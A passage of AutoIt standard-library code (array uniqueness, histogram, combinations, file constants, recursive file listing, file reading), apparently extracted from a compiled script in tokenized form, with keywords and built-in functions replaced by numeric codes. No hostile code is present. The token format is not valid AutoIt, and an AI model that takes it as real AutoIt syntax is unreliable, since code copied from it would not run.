4$ISUBITEM=415$ISUBITEM=0
43219($AARRAY)534287(1,0,0)
28$IDIM_1=369($AARRAY,$UBOUND_ROWS)-1
4$IEND=05$IEND=$IDIM_1
4$ISTART>$IEND534287(3,0,-1)
4$ISTART<02$IEND<0534287(3,0,-1)
4$ISTART>$IDIM_12$IEND>$IDIM_1534287(3,0,-1)
4$ISTART>$IEND534287(4,0,-1)
23369($AARRAY,$UBOUND_DIMENSIONS)
211
4$IDIRECTION5
13$I=$ISTART15$IEND
$AARRAY[$I]=337($AARRAY[$I],$ITRIMNUM)
14
6
13$I=$ISTART15$IEND
$AARRAY[$I]=336($AARRAY[$I],$ITRIMNUM)
14
8
212
28$IDIM_2=369($AARRAY,$UBOUND_COLUMNS)-1
4$ISUBITEM<02$ISUBITEM>$IDIM_2534287(5,0,-1)
4$IDIRECTION5
13$I=$ISTART15$IEND
$AARRAY[$I][$ISUBITEM]=337($AARRAY[$I][$ISUBITEM],$ITRIMNUM)
14
6
13$I=$ISTART15$IEND
$AARRAY[$I][$ISUBITEM]=336($AARRAY[$I][$ISUBITEM],$ITRIMNUM)
14
8
216
34287(2,0,0)
24
341
33
32_ARRAYUNIQUE(3036$AARRAY,$ICOLUMN=0,$IBASE=0,$ICASE=0,$ICOUNT=$ARRAYUNIQUE_COUNT,$IINTTYPE=$ARRAYUNIQUE_AUTO)
4$ICOLUMN=415$ICOLUMN=0
4$IBASE=415$IBASE=0
4$ICASE=415$ICASE=0
4$ICOUNT=415$ICOUNT=$ARRAYUNIQUE_COUNT
4369($AARRAY,$UBOUND_ROWS)=0534287(1,0,0)
28$IDIMS=369($AARRAY,$UBOUND_DIMENSIONS),$INUMCOLUMNS=369($AARRAY,$UBOUND_COLUMNS)
4$IDIMS>2534287(2,0,0)
4$IBASE<02$IBASE>12(3227($IBASE))534287(3,0,0)
4$ICASE<02$ICASE>12(3227($ICASE))534287(3,0,0)
4$ICOUNT<02$ICOUNT>12(3227($ICOUNT))534287(4,0,0)
4$IINTTYPE<02$IINTTYPE>42(3227($IINTTYPE))534287(5,0,0)
4$ICOLUMN<02($INUMCOLUMNS=01$ICOLUMN>0)2($INUMCOLUMNS>01$ICOLUMN>=$INUMCOLUMNS)534287(6,0,0)
4$IINTTYPE=$ARRAYUNIQUE_AUTO5
28$BINT,$SVARTYPE
4$IDIMS=15
$BINT=227($AARRAY[$IBASE])
$SVARTYPE=377($AARRAY[$IBASE])
6
$BINT=227($AARRAY[$IBASE][$ICOLUMN])
$SVARTYPE=377($AARRAY[$IBASE][$ICOLUMN])
8
4$BINT1$SVARTYPE="Int64"5
$IINTTYPE=$ARRAYUNIQUE_FORCE64
6
$IINTTYPE=$ARRAYUNIQUE_FORCE32
8
8
253("AutoIt.Error",__ARRAYUNIQUE_AUTOERRFUNC)
28$ODICTIONARY=251("Scripting.Dictionary")
$ODICTIONARY.CompareMode=250(3$ICASE)
28$VELEM,$STYPE,$VKEY,$BCOMERROR=40
13$I=$IBASE15369($AARRAY)-1
4$IDIMS=15
$VELEM=$AARRAY[$I]
6
$VELEM=$AARRAY[$I][$ICOLUMN]
8
23$IINTTYPE
21$ARRAYUNIQUE_FORCE32
$ODICTIONARY.Item($VELEM)
4@ERROR5
$BCOMERROR=39
18
8
21$ARRAYUNIQUE_FORCE64
$STYPE=377($VELEM)
4$STYPE="Int32"5
$BCOMERROR=39
18
8
$VKEY="#"&$STYPE&"#"&306($VELEM)
43$ODICTIONARY.Item($VKEY)5
$ODICTIONARY($VKEY)=$VELEM
8
21$ARRAYUNIQUE_MATCH
$STYPE=377($VELEM)
4322($STYPE,3)="Int"5
$VKEY="#Int#"&306($VELEM)
6
$VKEY="#"&$STYPE&"#"&306($VELEM)
8
43$ODICTIONARY.Item($VKEY)5
$ODICTIONARY($VKEY)=$VELEM
8
21$ARRAYUNIQUE_DISTINCT
$VKEY="#"&377($VELEM)&"#"&306($VELEM)
43$ODICTIONARY.Item($VKEY)5
$ODICTIONARY($VKEY)=$VELEM
8
24
14
28$AVALUES,$J=0
4$BCOMERROR5
34287(7,0,0)
7$IINTTYPE<>$ARRAYUNIQUE_FORCE325
28$AVALUES[$ODICTIONARY.Count]
13$VKEY17$ODICTIONARY.Keys()
$AVALUES[$J]=$ODICTIONARY($VKEY)
4322($VKEY,5)="#Ptr#"5
$AVALUES[$J]=273($AVALUES[$J])
8
$J+=1
14
6
$AVALUES=$ODICTIONARY.Keys()
8
4$ICOUNT5
_ARRAYINSERT($AVALUES,0,$ODICTIONARY.Count)
8
34$AVALUES
33
32_ARRAY1DTOHISTOGRAM($AARRAY,$ISIZING=100)
4369($AARRAY,0)>1534287(1,0,"")
$ISIZING=$ISIZING*8
28$T,$N,$IMIN=0,$IMAX=0,$IOFFSET=0
13$I=015369($AARRAY)-1
$T=$AARRAY[$I]
$T=230($T)280($T)0
4$T<$IMIN5$IMIN=$T
4$T>$IMAX5$IMAX=$T
14
28$IRANGE=217(280(($IMAX-$IMIN)/8))*8
28$ISPACERATIO=4
13$I=015369($AARRAY)-1
$T=$AARRAY[$I]
4$T5
$N=0(280(($ISIZING*$T)/$IRANGE)/8)
$AARRAY[$I]=""
4$T>05
4$IMIN5
$IOFFSET=217(0(280(($ISIZING*$IMIN)/$IRANGE)/8)/8*$ISPACERATIO)
$AARRAY[$I]=__ARRAY_STRINGREPEAT(29(32),$IOFFSET)
8
6
4$IMIN<>$T5
$IOFFSET=217(0(280(($ISIZING*($T-$IMIN))/$IRANGE)/8)/8*$ISPACERATIO)
$AARRAY[$I]=__ARRAY_STRINGREPEAT(29(32),$IOFFSET)
8
8
$AARRAY[$I]&=__ARRAY_STRINGREPEAT(29(9608),217($N/8))
$N=240($N,8)
4$N>05$AARRAY[$I]&=29(9608+8-$N)
$AARRAY[$I]&=" "&$T
6
$AARRAY[$I]=""
8
14
34$AARRAY
33
32__ARRAY_STRINGREPEAT($SSTRING,$IREPEATCOUNT)
$IREPEATCOUNT=217($IREPEATCOUNT)
4323($SSTRING)<12$IREPEATCOUNT<=0534287(1,0,"")
28$SRESULT=""
9$IREPEATCOUNT>1
417($IREPEATCOUNT,1)5$SRESULT&=$SSTRING
$SSTRING&=$SSTRING
$IREPEATCOUNT=21($IREPEATCOUNT,1)
10
34$SSTRING&$SRESULT
33
32__ARRAY_EXETERINTERNAL(36$AARRAY,$ISTART,$ISIZE,$SDELIMITER,36$AIDX,36$ARESULT,36$ICOUNT)
4$ISTART==$ISIZE-15
13$I=015$ISIZE-1
$ARESULT[$ICOUNT]&=$AARRAY[$AIDX[$I]]&$SDELIMITER
14
4$SDELIMITER<>""5$ARESULT[$ICOUNT]=337($ARESULT[$ICOUNT],323($SDELIMITER))
$ICOUNT+=1
6
28$ITEMP
13$I=$ISTART15$ISIZE-1
$ITEMP=$AIDX[$I]
$AIDX[$I]=$AIDX[$ISTART]
$AIDX[$ISTART]=$ITEMP
__ARRAY_EXETERINTERNAL($AARRAY,$ISTART+1,$ISIZE,$SDELIMITER,$AIDX,$ARESULT,$ICOUNT)
$AIDX[$ISTART]=$AIDX[$I]
$AIDX[$I]=$ITEMP
14
8
33
32__ARRAY_COMBINATIONS($IN,$IR)
28$I_TOTAL=1
13$I=$IR15116-1
$I_TOTAL*=($IN/$I)
$IN-=1
14
34280($I_TOTAL)
33
32__ARRAY_GETNEXT($IN,$IR,36$ILEFT,$ITOTAL,36$AIDX)
4$ILEFT==$ITOTAL5
$ILEFT-=1
34
8
28$I=$IR-1
9$AIDX[$I]==$IN-$IR+$I
$I-=1
10
$AIDX[$I]+=1
13$J=$I+115$IR-1
$AIDX[$J]=$AIDX[$I]+$J-$I
14
$ILEFT-=1
33
32__ARRAY_MINMAXINDEX(3036$AARRAY,$ICOMPNUMERIC,$ISTART,$IEND,$ISUBITEM,$FUCOMPARISON)
4$ICOMPNUMERIC=415$ICOMPNUMERIC=0
4$ICOMPNUMERIC<>15$ICOMPNUMERIC=0
4$ISTART=415$ISTART=0
4$IEND=415$IEND=0
4$ISUBITEM=415$ISUBITEM=0
43219($AARRAY)534287(1,0,-1)
28$IDIM_1=369($AARRAY,$UBOUND_ROWS)-1
4$IDIM_1<0534287(1,0,-1)
4$IEND=-15$IEND=$IDIM_1
4$ISTART=-15$ISTART=0
4$ISTART<-12$IEND<-1534287(3,0,-1)
4$ISTART>$IDIM_12$IEND>$IDIM_1534287(3,0,-1)
4$ISTART>$IEND534287(4,0,-1)
4$IDIM_1<0534287(5,0,-1)
28$IMAXMININDEX=$ISTART
23369($AARRAY,$UBOUND_DIMENSIONS)
211
4$ICOMPNUMERIC5
13$I=$ISTART15$IEND
4$FUCOMPARISON(250($AARRAY[$I]),250($AARRAY[$IMAXMININDEX]))5$IMAXMININDEX=$I
14
6
13$I=$ISTART15$IEND
4$FUCOMPARISON($AARRAY[$I],$AARRAY[$IMAXMININDEX])5$IMAXMININDEX=$I
14
8
212
4$ISUBITEM<02$ISUBITEM>369($AARRAY,$UBOUND_COLUMNS)-1534287(6,0,-1)
4$ICOMPNUMERIC5
13$I=$ISTART15$IEND
4$FUCOMPARISON(250($AARRAY[$I][$ISUBITEM]),250($AARRAY[$IMAXMININDEX][$ISUBITEM]))5$IMAXMININDEX=$I
14
6
13$I=$ISTART15$IEND
4$FUCOMPARISON($AARRAY[$I][$ISUBITEM],$AARRAY[$IMAXMININDEX][$ISUBITEM])5$IMAXMININDEX=$I
14
8
216
34287(2,0,-1)
24
34$IMAXMININDEX
33
32__ARRAY_GREATERTHAN($VVALUE1,$VVALUE2)
34$VVALUE1>$VVALUE2
33
32__ARRAY_LESSTHAN($VVALUE1,$VVALUE2)
34$VVALUE1<$VVALUE2
33
32__ARRAYUNIQUE_AUTOERRFUNC()
33
2930$FC_NOOVERWRITE=0
2930$FC_OVERWRITE=1
2930$FC_CREATEPATH=8
2930$FT_MODIFIED=0
2930$FT_CREATED=1
2930$FT_ACCESSED=2
2930$FT_ARRAY=0
2930$FT_STRING=1
2930$FSF_CREATEBUTTON=1
2930$FSF_NEWDIALOG=2
2930$FSF_EDITCONTROL=4
2930$FT_NONRECURSIVE=0
2930$FT_RECURSIVE=1
2930$FO_READ=0
2930$FO_APPEND=1
2930$FO_OVERWRITE=2
2930$FO_CREATEPATH=8
2930$FO_BINARY=16
2930$FO_UNICODE=32
2930$FO_UTF16_LE=32
2930$FO_UTF16_BE=64
2930$FO_UTF8=128
2930$FO_UTF8_NOBOM=256
2930$FO_ANSI=512
2930$FO_UTF16_LE_NOBOM=1024
2930$FO_UTF16_BE_NOBOM=2048
2930$FO_UTF8_FULL=16384
2930$FO_FULLFILE_DETECT=16384
2930$EOF=-1
2930$FD_FILEMUSTEXIST=1
2930$FD_PATHMUSTEXIST=2
2930$FD_MULTISELECT=4
2930$FD_PROMPTCREATENEW=8
2930$FD_PROMPTOVERWRITE=16
2930$CREATE_NEW=1
2930$CREATE_ALWAYS=2
2930$OPEN_EXISTING=3
2930$OPEN_ALWAYS=4
2930$TRUNCATE_EXISTING=5
2930$INVALID_SET_FILE_POINTER=-1
2930$FILE_BEGIN=0
2930$FILE_CURRENT=1
2930$FILE_END=2
2930$FILE_ATTRIBUTE_READONLY=1
2930$FILE_ATTRIBUTE_HIDDEN=2
2930$FILE_ATTRIBUTE_SYSTEM=4
2930$FILE_ATTRIBUTE_DIRECTORY=16
2930$FILE_ATTRIBUTE_ARCHIVE=32
2930$FILE_ATTRIBUTE_DEVICE=64
2930$FILE_ATTRIBUTE_NORMAL=128
2930$FILE_ATTRIBUTE_TEMPORARY=256
2930$FILE_ATTRIBUTE_SPARSE_FILE=512
2930$FILE_ATTRIBUTE_REPARSE_POINT=1024
2930$FILE_ATTRIBUTE_COMPRESSED=2048
2930$FILE_ATTRIBUTE_OFFLINE=4096
2930$FILE_ATTRIBUTE_NOT_CONTENT_INDEXED=8192
2930$FILE_ATTRIBUTE_ENCRYPTED=16384
2930$FILE_SHARE_READ=1
2930$FILE_SHARE_WRITE=2
2930$FILE_SHARE_DELETE=4
2930$FILE_SHARE_READWRITE=19($FILE_SHARE_READ,$FILE_SHARE_WRITE)
2930$FILE_SHARE_ANY=19($FILE_SHARE_READ,$FILE_SHARE_WRITE,$FILE_SHARE_DELETE)
2930$GENERIC_ALL=268435456
2930$GENERIC_EXECUTE=536870912
2930$GENERIC_WRITE=1073741824
2930$GENERIC_READ=-2147483648
2930$GENERIC_READWRITE=19($GENERIC_READ,$GENERIC_WRITE)
2930$FILE_ENCODING_UTF16LE=32
2930$FE_ENTIRE_UTF8=1
2930$FE_PARTIALFIRST_UTF8=2
2930$FN_FULLPATH=0
2930$FN_RELATIVEPATH=1
2930$FV_COMMENTS="Comments"
2930$FV_COMPANYNAME="CompanyName"
2930$FV_FILEDESCRIPTION="FileDescription"
2930$FV_FILEVERSION="FileVersion"
2930$FV_INTERNALNAME="InternalName"
2930$FV_LEGALCOPYRIGHT="LegalCopyright"
2930$FV_LEGALTRADEMARKS="LegalTrademarks"
2930$FV_ORIGINALFILENAME="OriginalFilename"
2930$FV_PRODUCTNAME="ProductName"
2930$FV_PRODUCTVERSION="ProductVersion"
2930$FV_PRIVATEBUILD="PrivateBuild"
2930$FV_SPECIALBUILD="SpecialBuild"
2930$FRTA_NOCOUNT=0
2930$FRTA_COUNT=1
2930$FRTA_INTARRAYS=2
2930$FRTA_ENTIRESPLIT=4
2930$FLTA_FILESFOLDERS=0
2930$FLTA_FILES=1
2930$FLTA_FOLDERS=2
2930$FLTAR_FILESFOLDERS=0
2930$FLTAR_FILES=1
2930$FLTAR_FOLDERS=2
2930$FLTAR_NOHIDDEN=4
2930$FLTAR_NOSYSTEM=8
2930$FLTAR_NOLINK=16
2930$FLTAR_NORECUR=0
2930$FLTAR_RECUR=1
2930$FLTAR_NOSORT=0
2930$FLTAR_SORT=1
2930$FLTAR_FASTSORT=2
2930$FLTAR_NOPATH=0
2930$FLTAR_RELPATH=1
2930$FLTAR_FULLPATH=2
2930$PATH_ORIGINAL=0
2930$PATH_DRIVE=1
2930$PATH_DIRECTORY=2
2930$PATH_FILENAME=3
2930$PATH_EXTENSION=4
32_FILECOUNTLINES($SFILEPATH)
114($SFILEPATH)
4@ERROR534287(@ERROR,@EXTENDED,0)
34@EXTENDED
33
32_FILECREATE($SFILEPATH)
28$HFILEOPEN=110($SFILEPATH,19($FO_OVERWRITE,$FO_CREATEPATH))
4$HFILEOPEN=-1534287(1,0,0)
28$IFILEWRITE=123($HFILEOPEN,"")
90($HFILEOPEN)
43$IFILEWRITE534287(2,0,0)
341
33
32_FILELISTTOARRAY($SFILEPATH,$SFILTER="*",$IFLAG=$FLTA_FILESFOLDERS,$BRETURNPATH=40)
28$SDELIMITER="|",$SFILELIST="",$SFILENAME="",$SFULLPATH=""
$SFILEPATH=327($SFILEPATH,"[\\/]+$","")&"\"
4$IFLAG=415$IFLAG=$FLTA_FILESFOLDERS
4$BRETURNPATH5$SFULLPATH=$SFILEPATH
4$SFILTER=415$SFILTER="*"
4395($SFILEPATH)534287(1,0,0)
4326($SFILTER,"[\\/:><\|]|(?s)^\s*$")534287(2,0,0)
43($IFLAG=02$IFLAG=12$IFLAG=2)534287(3,0,0)
28$HSEARCH=96($SFILEPATH&$SFILTER)
4@ERROR534287(4,0,0)
91
$SFILENAME=97($HSEARCH)
4@ERROR518
4($IFLAG+@EXTENDED=2)519
$SFILELIST&=$SDELIMITER&$SFULLPATH&$SFILENAME
10
90($HSEARCH)
4$SFILELIST=""534287(4,0,0)
34331(336($SFILELIST,1),$SDELIMITER)
33
32_FILELISTTOARRAYREC($SFILEPATH,$SMASK="*",$IRETURN=$FLTAR_FILESFOLDERS,$IRECUR=$FLTAR_NORECUR,$ISORT=$FLTAR_NOSORT,$IRETURNPATH=$FLTAR_RELPATH)
4395($SFILEPATH)534287(1,1,"")
4$SMASK=415$SMASK="*"
4$IRETURN=415$IRETURN=$FLTAR_FILESFOLDERS
4$IRECUR=415$IRECUR=$FLTAR_NORECUR
4$ISORT=415$ISORT=$FLTAR_NOSORT
4$IRETURNPATH=415$IRETURNPATH=$FLTAR_RELPATH
4$IRECUR>123227($IRECUR)534287(1,6,"")
28$BLONGPATH=40
4322($SFILEPATH,4)=="\\?\"5
$BLONGPATH=39
8
28$SFOLDERSLASH=""
4330($SFILEPATH,1)="\"5
$SFOLDERSLASH="\"
6
$SFILEPATH=$SFILEPATH&"\"
8
28$ASFOLDERSEARCHLIST[100]=[1]
$ASFOLDERSEARCHLIST[1]=$SFILEPATH
28$IHIDE_HS=0,$SHIDE_HS=""
417($IRETURN,$FLTAR_NOHIDDEN)5
$IHIDE_HS+=2
$SHIDE_HS&="H"
$IRETURN-=$FLTAR_NOHIDDEN
8
417($IRETURN,$FLTAR_NOSYSTEM)5
$IHIDE_HS+=4
$SHIDE_HS&="S"
$IRETURN-=$FLTAR_NOSYSTEM
8
28$IHIDE_LINK=0
417($IRETURN,$FLTAR_NOLINK)5
$IHIDE_LINK=1024
$IRETURN-=$FLTAR_NOLINK
8
28$IMAXLEVEL=0
4$IRECUR<05
328($SFILEPATH,"\","",0,$STR_NOCASESENSEBASIC)
$IMAXLEVEL=@EXTENDED-$IRECUR
8
28$SEXCLUDE_LIST="",$SEXCLUDE_LIST_FOLDER="",$SINCLUDE_LIST="*"
28$AMASKSPLIT=331($SMASK,"|")
23$AMASKSPLIT[0]
213
$SEXCLUDE_LIST_FOLDER=$AMASKSPLIT[3]
25
212
$SEXCLUDE_LIST=$AMASKSPLIT[2]
25
211
$SINCLUDE_LIST=$AMASKSPLIT[1]
24
28$SINCLUDE_FILE_MASK=".+"
4$SINCLUDE_LIST<>"*"5
43__FLTAR_LISTTOMASK($SINCLUDE_FILE_MASK,$SINCLUDE_LIST)534287(1,2,"")
8
28$SINCLUDE_FOLDER_MASK=".+"
23$IRETURN
210
23$IRECUR
210
$SINCLUDE_FOLDER_MASK=$SINCLUDE_FILE_MASK
24
212
$SINCLUDE_FOLDER_MASK=$SINCLUDE_FILE_MASK
24
28$SEXCLUDE_FILE_MASK=":"
4$SEXCLUDE_LIST<>""5
43__FLTAR_LISTTOMASK($SEXCLUDE_FILE_MASK,$SEXCLUDE_LIST)534287(1,3,"")
8
28$SEXCLUDE_FOLDER_MASK=":"
4$IRECUR5
4$SEXCLUDE_LIST_FOLDER5
43__FLTAR_LISTTOMASK($SEXCLUDE_FOLDER_MASK,$SEXCLUDE_LIST_FOLDER)534287(1,4,"")
8
4$IRETURN=25
$SEXCLUDE_FOLDER_MASK=$SEXCLUDE_FILE_MASK
8
6
$SEXCLUDE_FOLDER_MASK=$SEXCLUDE_FILE_MASK
8
43($IRETURN=02$IRETURN=12$IRETURN=2)534287(1,5,"")
43($ISORT=02$ISORT=12$ISORT=2)534287(1,7,"")
43($IRETURNPATH=02$IRETURNPATH=12$IRETURNPATH=2)534287(1,8,"")
4$IHIDE_LINK5
28$TFILE_DATA=65("struct;align 4;dword FileAttributes;uint64 CreationTime;uint64 LastAccessTime;uint64 LastWriteTime;"&"dword FileSizeHigh;dword FileSizeLow;dword Reserved0;dword Reserved1;wchar FileName[260];wchar AlternateFileName[14];endstruct")
28$HDLL=64("kernel32.dll"),$ADLL_RET
8
28$ASRETURNLIST[100]=[0]
28$ASFILEMATCHLIST=$ASRETURNLIST,$ASROOTFILEMATCHLIST=$ASRETURNLIST,$ASFOLDERMATCHLIST=$ASRETURNLIST
28$BFOLDER=40,$HSEARCH=0,$SCURRENTPATH="",$SNAME="",$SRETPATH=""
28$IATTRIBS=0,$SATTRIBS=""
28$ASFOLDERFILESECTIONLIST[100][2]=[[0,0]]
9$ASFOLDERSEARCHLIST[0]>0
$SCURRENTPATH=$ASFOLDERSEARCHLIST[$ASFOLDERSEARCHLIST[0]]
$ASFOLDERSEARCHLIST[0]-=1
23$IRETURNPATH
211
$SRETPATH=328($SCURRENTPATH,$SFILEPATH,"")
212
4$BLONGPATH5
$SRETPATH=336($SCURRENTPATH,4)
6
$SRETPATH=$SCURRENTPATH
8
24
4$IHIDE_LINK5
$ADLL_RET=58($HDLL,"handle","FindFirstFileW","wstr",$SCURRENTPATH&"*","struct*",$TFILE_DATA)
4@ERROR23$ADLL_RET[0]5
19
8
$HSEARCH=$ADLL_RET[0]
6
$HSEARCH=96($SCURRENTPATH&"*")
4$HSEARCH=-15
19
8
8
4$IRETURN=01$ISORT1$IRETURNPATH5
__FLTAR_ADDTOLIST($ASFOLDERFILESECTIONLIST,$SRETPATH,$ASFILEMATCHLIST[0]+1)
8
$SATTRIBS=""
91
4$IHIDE_LINK5
$ADLL_RET=58($HDLL,"int","FindNextFileW","handle",$HSEARCH,"struct*",$TFILE_DATA)
4@ERROR23$ADLL_RET[0]5
18
8
$SNAME=66($TFILE_DATA,"FileName")
4$SNAME=".."5
19
8
$IATTRIBS=66($TFILE_DATA,"FileAttributes")
4$IHIDE_HS117($IATTRIBS,$IHIDE_HS)5
19
8
417($IATTRIBS,$IHIDE_LINK)5
19
8
$BFOLDER=40
417($IATTRIBS,16)5
$BFOLDER=39
8
6
$BFOLDER=40
$SNAME=97($HSEARCH,1)
4@ERROR5
18
8
$SATTRIBS=@EXTENDED
4311($SATTRIBS,"D")5
$BFOLDER=39
8
4326($SATTRIBS,"["&$SHIDE_HS&"]")5
19
8
8
4$BFOLDER5
20
21$IRECUR<0
328($SCURRENTPATH,"\","",0,$STR_NOCASESENSEBASIC)
4@EXTENDED<$IMAXLEVEL5
25
8
21$IRECUR=1
43326($SNAME,$SEXCLUDE_FOLDER_MASK)5
__FLTAR_ADDTOLIST($ASFOLDERSEARCHLIST,$SCURRENTPATH&$SNAME&"\")
8
22
8
4$ISORT5
4$BFOLDER5
4326($SNAME,$SINCLUDE_FOLDER_MASK)13326($SNAME,$SEXCLUDE_FOLDER_MASK)5
__FLTAR_ADDTOLIST($ASFOLDERMATCHLIST,$SRETPATH&$SNAME&$SFOLDERSLASH)
8
6
4326($SNAME,$SINCLUDE_FILE_MASK)13326($SNAME,$SEXCLUDE_FILE_MASK)5
4$SCURRENTPATH=$SFILEPATH5
__FLTAR_ADDTOLIST($ASROOTFILEMATCHLIST,$SRETPATH&$SNAME)
6
__FLTAR_ADDTOLIST($ASFILEMATCHLIST,$SRETPATH&$SNAME)
8
8
8
6
4$BFOLDER5
4$IRETURN<>11326($SNAME,$SINCLUDE_FOLDER_MASK)13326($SNAME,$SEXCLUDE_FOLDER_MASK)5
__FLTAR_ADDTOLIST($ASRETURNLIST,$SRETPATH&$SNAME&$SFOLDERSLASH)
8
6
4$IRETURN<>21326($SNAME,$SINCLUDE_FILE_MASK)13326($SNAME,$SEXCLUDE_FILE_MASK)5
__FLTAR_ADDTOLIST($ASRETURNLIST,$SRETPATH&$SNAME)
8
8
8
10
4$IHIDE_LINK5
58($HDLL,"int","FindClose","ptr",$HSEARCH)
6
90($HSEARCH)
8
10
4$IHIDE_LINK5
63($HDLL)
8
4$ISORT5
23$IRETURN
212
4$ASFOLDERMATCHLIST[0]=0534287(1,9,"")
27$ASFOLDERMATCHLIST[$ASFOLDERMATCHLIST[0]+1]
$ASRETURNLIST=$ASFOLDERMATCHLIST
__ARRAYDUALPIVOTSORT($ASRETURNLIST,1,$ASRETURNLIST[0])
211
4$ASROOTFILEMATCHLIST[0]=01$ASFILEMATCHLIST[0]=0534287(1,9,"")
4$IRETURNPATH=05
__FLTAR_ADDFILELISTS($ASRETURNLIST,$ASROOTFILEMATCHLIST,$ASFILEMATCHLIST)
__ARRAYDUALPIVOTSORT($ASRETURNLIST,1,$ASRETURNLIST[0])
6
__FLTAR_ADDFILELISTS($ASRETURNLIST,$ASROOTFILEMATCHLIST,$ASFILEMATCHLIST,1)
8
210
4$ASROOTFILEMATCHLIST[0]=01$ASFOLDERMATCHLIST[0]=0534287(1,9,"")
4$IRETURNPATH=05
__FLTAR_ADDFILELISTS($ASRETURNLIST,$ASROOTFILEMATCHLIST,$ASFILEMATCHLIST)
$ASRETURNLIST[0]+=$ASFOLDERMATCHLIST[0]
27$ASFOLDERMATCHLIST[$ASFOLDERMATCHLIST[0]+1]
_ARRAYCONCATENATE($ASRETURNLIST,$ASFOLDERMATCHLIST,1)
__ARRAYDUALPIVOTSORT($ASRETURNLIST,1,$ASRETURNLIST[0])
6
28$ASRETURNLIST[$ASFILEMATCHLIST[0]+$ASROOTFILEMATCHLIST[0]+$ASFOLDERMATCHLIST[0]+1]
$ASRETURNLIST[0]=$ASFILEMATCHLIST[0]+$ASROOTFILEMATCHLIST[0]+$ASFOLDERMATCHLIST[0]
__ARRAYDUALPIVOTSORT($ASROOTFILEMATCHLIST,1,$ASROOTFILEMATCHLIST[0])
13$I=115$ASROOTFILEMATCHLIST[0]
$ASRETURNLIST[$I]=$ASROOTFILEMATCHLIST[$I]
14
28$INEXTINSERTIONINDEX=$ASROOTFILEMATCHLIST[0]+1
__ARRAYDUALPIVOTSORT($ASFOLDERMATCHLIST,1,$ASFOLDERMATCHLIST[0])
28$SFOLDERTOFIND=""
13$I=115$ASFOLDERMATCHLIST[0]
$ASRETURNLIST[$INEXTINSERTIONINDEX]=$ASFOLDERMATCHLIST[$I]
$INEXTINSERTIONINDEX+=1
4$SFOLDERSLASH5
$SFOLDERTOFIND=$ASFOLDERMATCHLIST[$I]
6
$SFOLDERTOFIND=$ASFOLDERMATCHLIST[$I]&"\"
8
28$IFILESECTIONENDINDEX=0,$IFILESECTIONSTARTINDEX=0
13$J=115$ASFOLDERFILESECTIONLIST[0][0]
4$SFOLDERTOFIND=$ASFOLDERFILESECTIONLIST[$J][0]5
$IFILESECTIONSTARTINDEX=$ASFOLDERFILESECTIONLIST[$J][1]
4$J=$ASFOLDERFILESECTIONLIST[0][0]5
$IFILESECTIONENDINDEX=$ASFILEMATCHLIST[0]
6
$IFILESECTIONENDINDEX=$ASFOLDERFILESECTIONLIST[$J+1][1]-1
8
4$ISORT=15
__ARRAYDUALPIVOTSORT($ASFILEMATCHLIST,$IFILESECTIONSTARTINDEX,$IFILESECTIONENDINDEX)
8
13$K=$IFILESECTIONSTARTINDEX15$IFILESECTIONENDINDEX
$ASRETURNLIST[$INEXTINSERTIONINDEX]=$ASFILEMATCHLIST[$K]
$INEXTINSERTIONINDEX+=1
14
18
8
14
14
8
24
6
4$ASRETURNLIST[0]=0534287(1,9,"")
27$ASRETURNLIST[$ASRETURNLIST[0]+1]
8
34$ASRETURNLIST
33
32__FLTAR_ADDFILELISTS(36$ASTARGET,$ASSOURCE_1,$ASSOURCE_2,$ISORT=0)
27$ASSOURCE_1[$ASSOURCE_1[0]+1]
4$ISORT=15__ARRAYDUALPIVOTSORT($ASSOURCE_1,1,$ASSOURCE_1[0])
$ASTARGET=$ASSOURCE_1
$ASTARGET[0]+=$ASSOURCE_2[0]
27$ASSOURCE_2[$ASSOURCE_2[0]+1]
4$ISORT=15__ARRAYDUALPIVOTSORT($ASSOURCE_2,1,$ASSOURCE_2[0])
_ARRAYCONCATENATE($ASTARGET,$ASSOURCE_2,1)
33
32__FLTAR_ADDTOLIST(36$ALIST,$VVALUE_0,$VVALUE_1=-1)
4$VVALUE_1=-15
$ALIST[0]+=1
4369($ALIST)<=$ALIST[0]527$ALIST[369($ALIST)*2]
$ALIST[$ALIST[0]]=$VVALUE_0
6
$ALIST[0][0]+=1
4369($ALIST)<=$ALIST[0][0]527$ALIST[369($ALIST)*2][2]
$ALIST[$ALIST[0][0]][0]=$VVALUE_0
$ALIST[$ALIST[0][0]][1]=$VVALUE_1
8
33
32__FLTAR_LISTTOMASK(36$SMASK,$SLIST)
4326($SLIST,"\\|/|:|\<|\>|\|")5340
$SLIST=328(333(327($SLIST,"\s*;\s*",";"),19($STR_STRIPLEADING,$STR_STRIPTRAILING)),";","|")
$SLIST=328(328(327($SLIST,"[][$^.{}()+\-]","\\$0"),"?","."),"*",".*?")
$SMASK="(?i)^("&$SLIST&")\z"
341
33
32_FILEPRINT($SFILEPATH,$ISHOW=@SW_HIDE)
34289($SFILEPATH,"",@WORKINGDIR,"print",$ISHOW=41@SW_HIDE$ISHOW)
33
32_FILEREADTOARRAY($SFILEPATH,36$VRETURN,$IFLAGS=$FRTA_COUNT,$SDELIMITER="")
$VRETURN=0
4$IFLAGS=415$IFLAGS=$FRTA_COUNT
4$SDELIMITER=415$SDELIMITER=""
28$BEXPAND=39
417($IFLAGS,$FRTA_INTARRAYS)5
$BEXPAND=40
$IFLAGS-=$FRTA_INTARRAYS
8
28$IENTIRE=$STR_CHRSPLIT
417($IFLAGS,$FRTA_ENTIRESPLIT)5
$IENTIRE=$STR_ENTIRESPLIT
$IFLAGS-=$FRTA_ENTIRESPLIT
8
28$INOCOUNT=0
4$IFLAGS<>$FRTA_COUNT5
$IFLAGS=$FRTA_NOCOUNT
$INOCOUNT=$STR_NOCOUNT
8
4$SDELIMITER5
28$ALINES=114($SFILEPATH)
4@ERROR534287(@ERROR,0,0)
28$IDIM_1=369($ALINES)+$IFLAGS
4$BEXPAND5
28$IDIM_2=369(331($ALINES[0],$SDELIMITER,$IENTIRE+$STR_NOCOUNT))
28$ATEMP_ARRAY[$IDIM_1][$IDIM_2]
28$IFIELDS,$ASPLIT
13$I=015$IDIM_1-$IFLAGS-1
$ASPLIT=331($ALINES[$I],$SDELIMITER,$IENTIRE+$STR_NOCOUNT)
$IFIELDS=369($ASPLIT)
4$IFIELDS<>$IDIM_25
34287(3,0,0)
8
13$J=015$IFIELDS-1
$ATEMP_ARRAY[$I+$IFLAGS][$J]=$ASPLIT[$J]
14
14
4$IDIM_2<2534287(4,0,0)
4$IFLAGS5
$ATEMP_ARRAY[0][0]=$IDIM_1-$IFLAGS
$ATEMP_ARRAY[0][1]=$IDIM_2
8
6
28$ATEMP_ARRAY[$IDIM_1]
